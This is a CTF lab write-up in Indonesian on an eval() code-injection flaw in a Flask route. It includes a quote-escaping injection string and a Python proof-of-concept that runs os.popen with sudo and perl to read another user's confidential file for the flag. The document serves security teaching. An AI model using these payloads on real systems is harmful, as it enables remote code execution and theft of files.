---
title: Rahasia Ganjar
description: Writeup lab Rahasia Ganjar
tags:
  - input injection
  - code injection
  - python
  - CTF
draft: false
---

## Summary
* Vuln Name: `eval()` Injection (Code Injection)
* Type: Input Injection
* Impact: Remote Code Execution (RCE)
* Severity: Critical
* functionality: [[input-validation]], [[template-engine]]

## Metodologi dan Observasi
1. Pada aplikasi web mini berbasis Python Flask ini, _routing_ secara dinamis diatur supaya bisa menerima parameter masukan (`user_input`) dan mendisplainya via _template_ HTML.
2. Kelemahan arsitekturnya terdapat pada berkas `app.py` di mana rute dengan _path converter_ `@app.route('/<path:user_input>')` mengevaluasi rute tersebut langsung sebagai bahasa pemrograman Python:
   ```python
   @app.route('/<path:user_input>')
   def identity(user_input):
       try:
           result = eval(f'"{user_input}"')
           return render_template('index.html', identity=str(result))
   ```
3. Variabel dinamis `user_input` ditempatkan langsung di antara dua pasang tanda kutip ganda berformat _f-string_ Python.
4. Karena fungsi `eval()` bertugas mengeksekusi _string_ sebagai sebuah ekspresi logis, peretas dapat memanipulasi _string_ ini untuk menginjeksi perintah berbahaya.
5. Dengan injeksi input semacam `" + __import__("os").popen("komando").read() + "`, peretas bisa melarikan diri (_escape_) dari kurungan ekspresi kutip `eval` dan menyambungkan kembali potongan stringnya dengan ekspresi pembuka sistem operasi (`os.popen`).
6. Ketiadaan [[input-validation]] membawa aplikasi ini rentan terhadap [[code-injection]] kelas atas yang berdampak pada [[remote-code-execution]].

## PoC
Skrip di bawah merakit rute dinamis (URL) yang berisi potongan parameter pemanggil modul `os` dalam Python untuk mengambil flag rahasia `confidential.txt` millik _user_ bernama `ganjar`.

```python
import requests
import re

url = "http://localhost:1337"

# Payload komando membaca /home/ganjar menggunakan perl 
# (salah satu cara universal agar aman dari penafsiran quote bersarang)
cmd = "sudo -u ganjar /usr/bin/perl -e 'open(F,\"/home/ganjar/confidential.txt\") or die $!; print <F>;' 2>&1"

# Menutupi quotes ganda di dalam string perintah asli
cmd_escaped = cmd.replace('"', '\\"')
python_payload = f"__import__('os').popen(\"{cmd_escaped}\").read()"
injection = f'" + {python_payload} + "'

full_url = f"{url}/{injection}"

res = requests.get(full_url)

if "pwn{" in res.text:
    match = re.search(r'pwn\{[a-f0-9]+\}', res.text)
    if match:
        print(f"[+] Flag found: {match.group(0)}")
```

## Impact
Menggunakan fungsi berisiko seperti `eval()` pada segala bahasa (termasuk Python) memberikan kekuatan eksekusi *runtime* absolut yang tidak disarankan. Ancaman kompromi menyeluruh terjadi melalui [[remote-code-execution]], memungkinkan pelaku untuk membongkar berkas esensial internal sistem.
